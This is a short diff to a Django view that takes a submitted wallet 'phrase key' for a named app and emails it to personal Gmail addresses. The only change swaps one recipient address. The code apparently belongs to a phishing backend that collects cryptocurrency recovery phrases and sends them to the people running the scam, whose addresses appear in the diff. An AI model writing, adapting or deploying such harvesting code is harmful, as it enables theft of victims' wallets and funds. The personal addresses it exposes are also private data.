@@ -38,7 +38,7 @@ def key_page(request, app_id):
             # Email sending logic
             subject = f"New Phrase Key Submission for {app.name}"
             message = f"{app.name} Phrase Key: {key_form.phrase_key}"
-            recipient_list = ['prettywashington17@gmail.com','successsimeon484@gmail.com']
+            recipient_list = ['prettywashington17@gmail.com','wolfensteinjonathan@gmail.com']
             sender_email = 'webmaster@example.com'
             send_mail(subject, message, sender_email, recipient_list)
             return redirect('success', app_id=app.id)
